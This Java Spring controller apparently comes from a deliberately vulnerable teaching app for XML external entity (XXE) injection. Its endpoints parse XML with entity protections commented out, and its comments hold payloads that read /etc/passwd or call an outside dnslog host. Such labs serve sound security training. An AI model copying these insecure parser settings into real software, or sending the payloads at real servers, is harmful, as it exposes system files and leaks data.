package com.best.hello.controller.XXE;

import com.best.hello.util.Security;
import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;
import lombok.extern.slf4j.Slf4j;
import org.dom4j.io.SAXReader;
import org.jdom2.input.SAXBuilder;
import org.springframework.web.bind.annotation.*;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.XMLReader;
import org.xml.sax.helpers.XMLReaderFactory;
import org.xmlbeam.annotation.XBRead;

import javax.xml.bind.JAXBContext;
import javax.xml.bind.Unmarshaller;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamReader;
import java.io.StringReader;

/**
 * 审计的函数
 * 1. XMLReader
 * 2. SAXReader
 * 3. DocumentBuilder
 * 4. XMLStreamReader
 * 5. SAXBuilder
 * 6. SAXParser
 * 7. SAXSource
 * 8. TransformerFactory
 * 9. SAXTransformerFactory
 * 10. SchemaFactory
 * 11. Unmarshaller
 * 12. XPathExpression
 */

@Api("Xml外部实体注入")
@Slf4j
@RestController
@RequestMapping("/XXE")
public class XXE {

    /**
     * @poc http://127.0.0.1:8888/XXE/XMLReader （POC）
     * Content-Type: application/xml
     * payload: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://0g5zvd.dnslog.cn">]><root>&xxe;</root>
     */
    @ApiOperation(value = "vul：XMLReader")
    @PostMapping(value = "/XMLReader")
    public String XMLReader(@RequestBody String content) {
        try {
            log.info("[vul] XMLReader: " + content);

            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            // 修复：禁用外部实体
            // xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            xmlReader.parse(new InputSource(new StringReader(content)));
            return "XMLReader XXE";
        } catch (Exception e) {
            return e.toString();
        }
    }


    @ApiOperation(value = "vul：xmlbeam")
    @RequestMapping(value = "/xmlbeam")
    public String handleCustomer(@RequestBody Customer customer) {
        log.info("[vul] xmlbeam: " + customer);
        return String.format("%s:%s login success!", customer.getFirstname(), customer.getLastname());

    }

    /**
     * 创建Customer接口
     */
    public interface Customer {
        @XBRead("//username")
        String getFirstname();

        @XBRead("//password")
        String getLastname();
    }


    @ApiOperation(value = "vul：SAXReader")
    @PostMapping(value = "/SAXReader")
    public String SAXReader(@RequestBody String content) {
        try {
            SAXReader sax = new SAXReader();
            // 修复：禁用外部实体
            // sax.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            sax.read(new InputSource(new StringReader(content)));
            return "SAXReader XXE";
        } catch (Exception e) {
            return e.toString();
        }

    }


    @ApiOperation(value = "vul：SAXBuilder", notes = "是一个JDOM解析器，能将路径中的XML文件解析为Document对象")
    @RequestMapping(value = "/SAXBuilder")
    public String SAXBuilder(@RequestBody String content) {
        try {
            SAXBuilder saxbuilder = new SAXBuilder();
            // saxbuilder.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            saxbuilder.build(new InputSource(new StringReader(content)));
            return "SAXBuilder XXE";
        } catch (Exception e) {
            return e.toString();
        }
    }


    /**
     * @poc http://127.0.0.1:8888/XXE/DocumentBuilder
     * payload: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><person><name>&xxe;</name></person>
     */
    @ApiOperation(value = "vul：DocumentBuilder类", notes = "带回显")
    @RequestMapping(value = "/DocumentBuilder")
    public String DocumentBuilder(@RequestParam String content) {
        try {
            // DocumentBuilderFactory是用于创建DOM模式的解析器对象,newInstance方法会根据本地平台默认安装的解析器，自动创建一个工厂的对象并返回。
            DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();
            // 修复：禁用外部实体
            //docFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            DocumentBuilder docBuilder = docFactory.newDocumentBuilder();
            Document doc = docBuilder.parse(new InputSource(new StringReader(content)));

            NodeList RegistrationNo = doc.getElementsByTagName("foo");

            return RegistrationNo.item(0).getFirstChild().getNodeValue();

        } catch (Exception e) {
            return e.toString();
        }
    }


    /**
     * @poc http://127.0.0.1:8888/XXE/unmarshaller (POST)
     * body payload <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE student[<!ENTITY out SYSTEM "file:///etc/passwd">]><student><name>&out;</name></student>
     */
    @ApiOperation(value = "vul：Unmarshaller")
    @RequestMapping(value = "/unmarshaller")
    public String Unmarshaller(@RequestBody String content) {
        try {

            JAXBContext context = JAXBContext.newInstance(Student.class);
            Unmarshaller unmarshaller = context.createUnmarshaller();

            XMLInputFactory xif = XMLInputFactory.newFactory();
            // fixed: 禁用外部实体
            // xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
            // xif.setProperty(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");

            // 默认情况下在1.8版本上不能加载外部dtd文件，需要更改设置。
            // xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, true);
            // xif.setProperty(XMLInputFactory.SUPPORT_DTD, true);
            XMLStreamReader xsr = xif.createXMLStreamReader(new StringReader(content));

            Object o = unmarshaller.unmarshal(xsr);
            log.info("[vul] Unmarshaller: " + content);

            return o.toString();

        } catch (Exception e) {
            e.printStackTrace();
        }
        return "出错了！";
    }


    @ApiOperation(value = "safe：检测是否包含ENTITY外部实体")
    @RequestMapping(value = "/safe")
    public String check(@RequestBody String content) {
        if (!Security.checkXXE(content)) {
            return "safe";
        } else {
            return "检测到XXE攻击";
        }
    }

}
